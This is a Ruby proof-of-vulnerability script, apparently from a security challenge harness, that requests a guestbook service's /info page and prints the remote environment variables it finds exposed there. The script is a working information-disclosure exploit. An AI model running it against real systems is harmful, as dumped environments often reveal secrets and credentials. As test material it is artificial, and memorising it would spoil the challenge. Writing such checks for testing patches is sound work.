#!/usr/bin/env ruby
# Copyright (c) 2026 Cromulence
# seconds to wait for a given activity
DEFAULT_TIME_LIMIT = 5

require "fileutils"
require "mechanize"
require "nokogiri"
require "pp"
require "timeout"

require_relative "./lib/assertions"
require_relative "./lib/logger"
require_relative "./lib/signature"

class Pov
  attr_reader :host, :port

  def initialize
    @host = ENV["HOST"] || "guestbook"
    @port = (ENV["PORT"] || 8080).to_i

    @assertions = 0

    @base_url = "http://#{@host}:#{@port}"
  end

  def run!
    pwn
  end

  include Assertions

  def pwn
    with_agent do |mech|
      uri = URI("#{@base_url}/info")
      index = mech.get(uri)

      if "404" == index.code
        LLL.info "Got 404, probably not vulnerable"
        exit 1
      end

      crow_env = index.at "dl.crow-env"

      if crow_env.nil? || crow_env.children.empty?
        LLL.error "No crow-env found in response"
        exit 1
      end

      crow_env.children.each do |child|
        next unless child.is_a?(Nokogiri::XML::Element)
        case child.name
        when "dt"
          puts child.text
        when "dd"
          puts "\t#{child.text}"
        end
      end

      LLL.info "successfully dumped remote environment"
    end
  end

  private

  def with_agent
    Mechanize.start do |mech|
      begin
        mech.follow_redirect = false
        mech.agent.allowed_error_codes = [404, 425]
        yield mech
      rescue
        if mech && mech.current_page && mech.current_page.body
          FileUtils.mkdir_p File.join(__dir__, "tmp")
          dump_filename = File.join(__dir__, "tmp",
                                    "#{Time.now.to_i}-s#{@seed}")

          File.open(dump_filename, "w") { |d| d.write mech.current_page.body }

          LLL.fatal dump_filename
        end
        raise
      end
    end
  end
end

if $0 == __FILE__
  pov = Pov.new

  at_exit do
    LLL.info(["ruby", $0, *ARGV].join(" "))
  end

  pov.run!
end
